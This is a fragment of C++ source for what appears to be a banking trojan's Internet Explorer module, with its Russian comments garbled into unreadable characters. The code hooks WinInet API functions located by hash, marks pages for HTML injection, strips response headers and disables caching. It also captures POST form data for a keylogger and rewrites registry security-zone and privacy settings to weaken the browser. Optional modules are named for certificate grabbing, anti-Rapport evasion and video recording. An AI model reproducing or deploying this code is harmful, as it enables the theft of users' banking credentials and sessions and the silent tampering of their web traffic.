	LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut,
	DWORD dwFlags, DWORD_PTR dwContext)
{

	return HttpSendRequestExHandler(TRUE, hRequest, lpBuffersIn, lpBuffersOut,
		dwFlags, dwContext);

}
// -----------------------------------------------------------------------------

BOOL __stdcall HOOK_HttpSendRequestExW(HINTERNET hRequest,
	LPINTERNET_BUFFERSW lpBuffersIn, LPINTERNET_BUFFERSW lpBuffersOut,
	DWORD dwFlags, DWORD_PTR dwContext)
{
	return HttpSendRequestExHandler(FALSE, hRequest, (LPINTERNET_BUFFERSA)
				lpBuffersIn, (LPINTERNET_BUFFERSA)lpBuffersOut, dwFlags, dwContext);

}
// -----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer,
	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
	return InternetHandler(0, hFile, lpBuffer, dwNumberOfBytesToRead,
		lpdwNumberOfBytesRead, 0, 0);
}
// ----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetReadFileExA(HINTERNET hFile,
	LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
{
	return InternetHandler(1, hFile, lpBuffersOut, 0, 0, dwFlags, dwContext);
}
// ----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetReadFileExW(HINTERNET hFile,
	LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
{
	return InternetHandler(2, hFile, lpBuffersOut, 0, 0, dwFlags, dwContext);
}
// ----------------------------------------------------------------------------

BOOL __stdcall HOOK_InternetQueryDataAvailable(HINTERNET hFile,
	LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext)
{
	return InternetHandler(3, hFile, NULL, 0, lpdwNumberOfBytesAvailable,
		dwFlags, dwContext);
}
// ----------------------------------------------------------------------------

BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet)
{
	// ������� ��������� ����������
	// ������� ������ �������
	PRequest R = Request::Find(Requests, hInternet);
	if (R)
	{

		if (R->AllowClose != NULL)
		{
			pWaitForSingleObject(R->AllowClose, INFINITE);
        }

		PRequest R = Request::Find(Requests, hInternet);
		if (R)
		{
			IEDBG(R, NULL, "���������� �������");
			Request::Delete(Requests, hInternet);
		}
	}

	return REAL_InternetCloseHandle(hInternet);
}
// ----------------------------------------------------------------------------


void ProcessInternetConnection(HINTERNET Handle, LPBYTE InetServer, bool IsSecure, bool IsUnicode)
{
	// ������������ ����������� � �������
	if (Handle == NULL || InetServer == NULL)
		return;

	// ��������� ������ � ������ ��������
	// � ������ ���� �� ������� �������� ���� ������ ������������� ��� ����
	// � ������ ��������� ���������
	bool Existed = false;
	PRequest R = Request::Add(Requests, Handle, &Existed);
	if (R == NULL || Existed)
		return;

	// �������� ����� �������

	PCHAR Server = (IsUnicode)? (WSTR::ToAnsi((PWCHAR)InetServer, 0)) :
								((PCHAR)InetServer);

	PCHAR Protocol = (IsSecure)? ProtocolHTTPS : ProtocolHTTP;

	R->URL = STR::New(3, Protocol, HTTPProtocolDelimeter, Server);
    R->IsSecure = IsSecure;

	if (IsUnicode)
        STR::Free(Server);
}


HINTERNET WINAPI HOOK_InternetConnectA(HINTERNET hInternet,
	LPCSTR lpszServerName, INTERNET_PORT nServerPort,
	LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService,
	DWORD dwFlags, DWORD_PTR dwContext)
{
	// ������ �����������
	HINTERNET Handle = REAL_InternetConnectA(hInternet, lpszServerName,
							nServerPort, lpszUserName, lpszPassword, dwService,
							dwFlags, dwContext);

	if (dwService == INTERNET_SERVICE_HTTP)
	{
		bool IsSecure = (dwFlags & INTERNET_FLAG_SECURE) != 0;
		ProcessInternetConnection(Handle, (LPBYTE)lpszServerName, IsSecure, false);
	}
	return Handle;
}

HINTERNET WINAPI HOOK_InternetConnectW(HINTERNET hInternet,
	LPCSTR lpszServerName, INTERNET_PORT nServerPort,
	LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService,
	DWORD dwFlags, DWORD_PTR dwContext)
{
	// ������ �����������
	HINTERNET Handle = REAL_InternetConnectW(hInternet, lpszServerName,
					 	nServerPort, lpszUserName, lpszPassword, dwService,
						dwFlags, dwContext);

	if (dwService == INTERNET_SERVICE_HTTP)
	{
		bool IsSecure = (dwFlags & INTERNET_FLAG_SECURE) != 0;
		ProcessInternetConnection(Handle, (LPBYTE)lpszServerName, IsSecure, true);
	}
	return Handle;
}
//-----------------------------------------------------------------------------

#ifdef HTMLInjectsH
	void ProcessRequest(HINTERNET Connect, LPCSTR Verb, LPCSTR Object, DWORD &Flags)
	{
		// ������� ������������ ������
		PRequest R = Request::Find(Requests, Connect);
		if (R == NULL) return;


		PCHAR URL =  STR::New(2, R->URL, Object);

		THTTPMethod Method = GetMethodFromStr((PCHAR)Verb);

		// ��������� �� �������� �� ��������
		if (Config::IsInjectURL(URL, Method))
		{
			// � ������ ���� �������� �� ��������, �� ������ ����� ��������

			Flags = Flags & (~INTERNET_FLAG_HYPERLINK);

			if (R->IsSecure)
		   		Flags = Flags | INTERNET_FLAG_RELOAD;
			else
				Flags = Flags | INTERNET_FLAG_PRAGMA_NOCACHE |
								INTERNET_FLAG_RESYNCHRONIZE;
		}

		STR::Free(URL);
	}
#endif



HINTERNET WINAPI HOOK_HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb,
	LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer,
	LPCSTR FAR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
 {
	#ifdef HTMLInjectsH
		ProcessRequest(hConnect, lpszVerb, lpszObjectName, dwFlags);
	#endif

	return REAL_HttpOpenRequestA(hConnect, lpszVerb, lpszObjectName,
		lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}
// ----------------------------------------------------------------------------

HINTERNET WINAPI HOOK_HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb,
	LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer,
	LPCWSTR FAR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{

	#ifdef HTMLInjectsH
		PCHAR Verb = WSTR::ToAnsi(lpszVerb, 0);
		PCHAR Path = WSTR::ToAnsi(lpszObjectName, 0);

		ProcessRequest(hConnect, Verb, Path, dwFlags);

		STR::Free(Verb);
		STR::Free(Path);
	#endif


	return REAL_HttpOpenRequestW(hConnect, lpszVerb, lpszObjectName,
		lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}
// ----------------------------------------------------------------------------

BOOL WINAPI HOOK_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel,
	LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)

{
	DWORD Max = *lpdwBufferLength;

	BOOL Result =  REAL_HttpQueryInfoA(hRequest, dwInfoLevel,
		lpBuffer, lpdwBufferLength, lpdwIndex);


	PRequest R = Request::Find(Requests, hRequest);

	PCHAR Buf = (PCHAR)lpBuffer;

	if (R != NULL && R->IsInject)
	if (dwInfoLevel == HTTP_QUERY_RAW_HEADERS_CRLF)
	{

		PCHAR Buf = (PCHAR)lpBuffer;
		DWORD Cur = *lpdwBufferLength;
		if (Cur < Max)
			*(Buf + Cur) = 0;

		HTTPParser::SetHeaderValue(Buf, Cur, Max, ParamCacheControl, ValueNoCacheDocument, lpdwBufferLength);
		*lpdwBufferLength = AnsiStr::Length(Buf);

		*lpdwBufferLength = HTTPParser::DeleteHeader(ParamContentLength, Buf, *lpdwBufferLength);
	}

    return Result;
}


BOOL WINAPI HOOK_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel,
	LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)

{
	BOOL Result =  REAL_HttpQueryInfoW(hRequest, dwInfoLevel,
		lpBuffer, lpdwBufferLength, lpdwIndex);
	return Result;
}

// ----------------------------------------------------------------------------


#ifdef UniversalKeyLoggerH
	BOOL WINAPI HOOK_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten )
	{
		// �������� ������� ���������
		THTTPRequestData Data;
		ClearStruct(Data);

		Data.Browser      = BrowserIE;
		Data.Handle       = hFile;
		Data.URL          = GetInetOption(hFile, INTERNET_OPTION_URL);
		Data.PostData     = (PCHAR)lpBuffer;
		Data.PostDataSize = dwNumberOfBytesToWrite;

		KeyLogger::CallEvent(KLE_INTERNET_WRITE_FILE, &Data);

		STR::Free(Data.URL);

		return REAL_InternetWriteFile( hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten );
	}
#endif
// ----------------------------------------------------------------------------


bool WINAPI IsInternetExplorer()
{
	// ������� ����� ������ ���� ��� ������� � ��������
	// �������� ����������

	DWORD Hash = File::GetNameHashA(Bot->ApplicationName(), true);

	bool IsIE = Hash == 0x250DFA8F /* iexplore.exe */ ||
				Hash == 0x1D30C46B /* ��� ��� ����� */;

	return IsIE;
}
// ----------------------------------------------------------------------------

void IEClearCache()
{
	// ������� ������� ��� �������� ����������.
	BOOL bResult = FALSE;
	BOOL bDone = FALSE;

	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;

	DWORD dwTrySize, dwEntrySize = 4096;

	HANDLE hCacheDir = NULL;

	DWORD dwError = ERROR_INSUFFICIENT_BUFFER;

	do {
		switch(dwError) {
		case ERROR_INSUFFICIENT_BUFFER:

			if (lpCacheEntry != NULL) {
				MemFree(lpCacheEntry);
			}

			lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwEntrySize);

			if (lpCacheEntry == NULL) {
				return;
			}

			lpCacheEntry->dwStructSize = dwEntrySize;

			dwTrySize = dwEntrySize;

			BOOL bSuccess;

			if (hCacheDir == NULL) {
				bSuccess = (hCacheDir = (HANDLE)pFindFirstUrlCacheEntryA
					(NULL, lpCacheEntry, &dwTrySize)) != NULL;
			}
			else {
				bSuccess = (BOOL)pFindNextUrlCacheEntryA
					(hCacheDir, lpCacheEntry, &dwTrySize);
			}

			if (bSuccess) {
				dwError = ERROR_SUCCESS;
			}
			else {
				dwError = (DWORD)pGetLastError();
				dwEntrySize = dwTrySize; // ���������� ����� ������ ������
			}

			break;

		case ERROR_NO_MORE_ITEMS:

			bDone = TRUE;
			bResult = TRUE;

			break;

		case ERROR_SUCCESS:

			pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);

			dwTrySize = dwEntrySize;

			if (pFindNextUrlCacheEntryA(hCacheDir, lpCacheEntry, &dwTrySize)) {
				dwError = ERROR_SUCCESS;
			}
			else {
				dwError = (DWORD)pGetLastError();
				dwEntrySize = dwTrySize;
			}

			break;

		default:

			bDone = TRUE;

			break;
		}

		if (bDone) {
			MemFree(lpCacheEntry);

			if (hCacheDir) {
				pFindCloseUrlCache(hCacheDir);
			}
		}
	}
	while (!bDone);

	return;
}
// ----------------------------------------------------------------------------

// *********************************************************************
// UpdateIERegistry - ������ ��������� �������, ��� ����������
// �������� ������� ������������
// *********************************************************************

void UpdateIERegistry()
{
	string IEPath = "Software\\Microsoft\\Internet Explorer\\";

	const static char* RegPathMaxScriptStatements = "Styles";
	const static char* RegPathPrivacy = "Privacy";

	const static char* ParamCleanCookies        = "CleanCookies";
	const static char* ParamMaxScriptStatements = "MaxScriptStatements";


	// ������� ����������� �� ������������ ����� ���������� ��� ��������
	string Path = IEPath + RegPathMaxScriptStatements;
	Registry::CreateKey(HKEY_CURRENT_USER, IEPath.t_str(), (PCHAR)RegPathMaxScriptStatements);
	Registry::SetValueDWORD(HKEY_CURRENT_USER, Path.t_str(), (PCHAR)ParamMaxScriptStatements, 0xFFFFFFFF);


	// ��������� ������� ����� �� ������ �� ��
	Path = IEPath + RegPathPrivacy;
	Registry::SetValueDWORD(HKEY_CURRENT_USER, Path.t_str(), (PCHAR)ParamCleanCookies, 0);



	// ��������� ��������� ������������
	PCHAR RegPathZone =
		"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\";

	PCHAR ZoneParam1609 = "1609";
	PCHAR ZoneParam1406 = "1406";
	PCHAR AllZoneParams[] = {ZoneParam1609, ZoneParam1406, NULL};


	for (DWORD i = 0; i <= 4; i++)
	{
		PCHAR D = StrLongToString(i);
		PCHAR Path = STR::New(2, RegPathZone, D);

		for (int j = 0; AllZoneParams[j] != NULL; j++)
		{
			Registry::SetValueDWORD(HKEY_CURRENT_USER, Path, AllZoneParams[j], 0);
            Registry::SetValueDWORD(HKEY_LOCAL_MACHINE, Path, AllZoneParams[j], 0);
		}

		STR::Free(D);
		STR::Free(Path);
	}
}
// ----------------------------------------------------------------------------


bool HookInternetExplorer()
{
	// ������� ������ ���� �� ������� ������� ������� ����������
	// Internet Explorer ��� �������� ����������
	// �������� ������ � ������ ������ �� �������� �������� ����������
	if (!IsInternetExplorer())
		return false;

	IEDBG("������������� InternetExplorer:");

#ifdef HTMLInjectsH
	IEDBG("�������������� HTML �������");
	Config::Initialize();
#endif

	if (!HookInternetExplorerApi())
		return false;

	// �������������� �������� �� ��������
#ifdef HunterH
	IEDBG("�������������� ������ �������");
	URLHunter::Initialize();
#endif

	// ��������� ������ ������������
#ifdef CertGrabH
	IEDBG("�������������� ������ ������������");
	CertGrabber::Initialize();
#endif

#ifdef JAVS_PATCHERH
	SetJavaPatcherHook();
#endif

	IEDBG("�������� ��������� ������������������");
	return true;
}
// ----------------------------------------------------------------------------


bool HookInternetExplorerApi()
{
	// HookInternetExplorerApi - ������� ������ ���� �� �������� API
	// ������� ���������� �������� ��������� ��� �������� �������


	IEDBG("�������� ������� WinAPI");

	#ifdef antirapportH
		AntiRapport(); // ������� ���� �����������
	#endif

	//UnhookIE();

	IEDBG("�������������� ���������� ������");
	InitIEGlobalData();

	IEDBG("������ ��������� �������");
	UpdateIERegistry();

	DWORD dwHash_HttpSendRequestA = 0x9F13856A;
	DWORD dwHash_HttpSendRequestW = 0x9F13857C;

	DWORD dwHash_HttpSendRequestExA = 0xE15B9B85;
	DWORD dwHash_HttpSendRequestExW = 0xE15B9B93;

	DWORD dwHash_InternetReadFile = 0x1A212962;

	DWORD dwHash_InternetReadFileExA = 0x2C523864;
	DWORD dwHash_InternetReadFileExW = 0x2C523872;

	DWORD dwHash_InternetQueryDataAvailable = 0x7EDEC584;

	DWORD dwHash_InternetCloseHandle = 0x7314FB0C;

	DWORD Hash_HttpOpenRequestA = 0x1510002F;
	DWORD Hash_HttpOpenRequestW = 0x15100039;

	#define Hash_HttpQueryInfoA 0x2F5CE027 /* HttpQueryInfoA */
	#define Hash_HttpQueryInfoW 0x2F5CE031 /* HttpQueryInfoW */
	#define Hash_InternetConnectA 0xBE618D3E /* InternetConnectA */
	#define Hash_InternetConnectW 0xBE618D28 /* InternetConnectW */
	#define Hash_InternetWriteFile 0x205BD56A /* InternetWriteFile */

	IEDBG("������ ����");

	if (HookApi(DLL_WININET, Hash_InternetConnectA, &HOOK_InternetConnectA))
	{
		__asm mov[REAL_InternetConnectA], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, Hash_InternetConnectW, &HOOK_InternetConnectW))
	{
		__asm mov[REAL_InternetConnectW], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_HttpSendRequestA, &HOOK_HttpSendRequestA))
	{
		__asm mov[REAL_HttpSendRequestA], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_HttpSendRequestW, &HOOK_HttpSendRequestW)) {
		__asm mov[REAL_HttpSendRequestW], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_HttpSendRequestExA, &HOOK_HttpSendRequestExA)
		) {
		__asm mov[REAL_HttpSendRequestExA], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_HttpSendRequestExW, &HOOK_HttpSendRequestExW)
		) {
		__asm mov[REAL_HttpSendRequestExW], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_InternetReadFile, &HOOK_InternetReadFile)) {
		__asm mov[REAL_InternetReadFile], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_InternetReadFileExA,
			&HOOK_InternetReadFileExA)) {
		__asm mov[REAL_InternetReadFileExA], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_InternetReadFileExW,
			&HOOK_InternetReadFileExW)) {
		__asm mov[REAL_InternetReadFileExW], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_InternetQueryDataAvailable,
			&HOOK_InternetQueryDataAvailable)) {
		__asm mov[REAL_InternetQueryDataAvailable], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, dwHash_InternetCloseHandle, &HOOK_InternetCloseHandle)) {
		__asm mov[REAL_InternetCloseHandle], eax
	}
	else
		return false;

	if (HookApi(DLL_WININET, Hash_HttpOpenRequestA, &HOOK_HttpOpenRequestA)) {
		__asm mov[REAL_HttpOpenRequestA], eax
	}

	if (HookApi(DLL_WININET, Hash_HttpOpenRequestW, &HOOK_HttpOpenRequestW)) {
		__asm mov[REAL_HttpOpenRequestW], eax
	}


	if (HookApi(DLL_WININET, Hash_HttpQueryInfoA, &HOOK_HttpQueryInfoA)) {
		__asm mov[REAL_HttpQueryInfoA], eax
	}

	if (HookApi(DLL_WININET, Hash_HttpQueryInfoW, &HOOK_HttpQueryInfoW)) {
		__asm mov[REAL_HttpQueryInfoW], eax
	}


	// �������� ������� ������ ������ ��� ���������� ��������� � �����������
	// ������ BSS
	#if defined(UniversalKeyLoggerH) && !defined(BSSH)
	if ( HookApi( DLL_WININET, Hash_InternetWriteFile, &HOOK_InternetWriteFile ) )
	{
		__asm mov [REAL_InternetWriteFile], eax
	}

    #endif
	//-------------------------------------------------

	#ifdef bsssignH
		IEDBG("�������������� BSSSign");
		BSSSign::Initialize();
	#endif

	#ifdef StealthBrowserH
		IEDBG("�������������� ������� �������");
		SetHooksForSB();
	#endif

	#ifdef JavaKeyLogH
		IEDBG("�������������� Java Key Logger");
		StartJavaKeyLogger();
	#endif

  	#ifdef VideoRecorderH
		IEDBG("��������� ����� ��������");
		StartVideoFromCurrentURL();
	#endif

	#ifdef BSSH
		BSSHooks();
	#endif

	IEDBG("������� WinInet ������� �����������");

	return true;
}
